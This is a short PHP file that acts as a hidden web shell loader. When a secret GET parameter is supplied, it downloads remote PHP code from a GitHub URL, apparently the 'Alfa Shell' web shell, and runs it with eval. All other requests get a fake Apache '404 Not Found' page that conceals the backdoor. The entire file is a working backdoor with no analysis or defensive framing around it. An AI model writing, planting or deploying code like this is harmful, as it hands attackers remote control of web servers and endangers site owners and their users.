<?
if(isset($_GET['123123123'])){
@eval("?>".file_get_contents("https://raw.githubusercontent.com/0xNix/Alfa-Shell-V4.1/main/alfa.php"));
}else{
    echo "<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> 
<hr> 
<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
";
}
?>
